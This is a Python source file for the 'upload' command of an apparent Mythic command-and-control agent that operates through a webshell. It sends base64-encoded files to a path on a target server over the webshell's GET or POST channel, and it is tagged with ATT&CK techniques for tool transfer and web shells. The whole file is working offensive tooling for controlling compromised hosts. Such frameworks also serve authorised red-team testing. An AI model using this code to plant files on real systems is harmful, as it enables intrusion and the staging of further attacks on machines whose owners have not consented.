import base64
import logging
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from enyxma.WebshellRPC import WebshellRPC

logger = logging.getLogger(__name__)

class UploadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)

        # Define two parameters: remote path and the file to upload
        self.args = [
            CommandParameter(name="file_path",
                             type=ParameterType.String,
                             description="Full path (including filename) on the target where the file will be written"),
            CommandParameter(name="file",
                             type=ParameterType.File,
                             description="Local file to upload (will be stored in Mythic)")
        ]

    async def parse_arguments(self):
        """
        Load both arguments from the JSON-formatted command_line.
        """
        if len(self.command_line.strip()) <= 0:
            raise ValueError("Missing arguments: file_path and file")
        elif self.command_line.strip()[0] == '{':
            self.load_args_from_json_string(self.command_line.strip())
        else:
            self.add_arg("file_path", self.command_line.strip())


class UploadCommand(CommandBase):
    cmd = "upload"
    needs_admin = False
    help_cmd = "upload [<file_path> <file_id>]"
    description = "Upload a local file to the remote webshell.\nNote: Intended for small files (up to a few kilobytes); uploading large files may cause timeouts or performance issues"
    version = 1
    author = "@Termindiego25"
    argument_class = UploadArguments
    supported_ui_features = ["file_browser:upload"]
    # Map the command to the appropriate MITRE ATT&CK techniques
    attackmapping = ["T1105", "T1071.001", "T1132.001", "T1505.003"]

    async def create_go_tasking(
        self,
        taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        """
        1) Retrieve file_path and local AgentFileId
        2) Fetch the file contents from Mythic via RPC
        3) Base64‑encode and send to the webshell via WebshellRPC
        4) Return the webshell’s output back to the Mythic UI
        """
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True
        )
        user_input = taskData.args.get_arg("file_path")
        file_id = taskData.args.get_arg("file")
        response.DisplayParams = user_input

        # Fetch the file bytes stored in Mythic
        file_contents = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(AgentFileId=file_id)
        )
        if not file_contents.Success:
            response.Error = file_contents.Error
            return response

        # Base64‑encode the file bytes
        content_b64 = base64.b64encode(file_contents.Content).decode()

        # Construct the command in the form "upload <file_path> <content_b64>"
        command = f"upload {user_input} {content_b64}"
        logger.info(f"Preparing upload command: {command}")
        try:
            # Determine the request method from the C2 profile parameters
            requestType = taskData.C2Profiles[0].Parameters.get("request_type", "POST").upper()
            logger.info(f"Request type for upload: {requestType}")
            
            # Dispatch the command based on the chosen HTTP method
            if requestType == "GET":
                response_data = await WebshellRPC.GetRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            else:
                response_data = await WebshellRPC.PostRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            
            # If webshell returns empty, instruct Mythic to re-send manually
            if len(response_data) == 0:
                    taskData.args.set_manual_args(command)
                    response.Completed = False
                    response.Success = True
                    return response
            
            # Forward the raw webshell reply to the UI
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=response_data
                )
            )
            response.Success = True
        except Exception as e:
            logger.exception("[upload] error during command execution")
            response.Error = f"Upload failed: {e}"

        if response.Error != "":
            # If we captured an error, send it as a normal response
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(
        self,
        task: PTTaskMessageAllData,
        response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=response.encode("UTF8"),
        ))
        return resp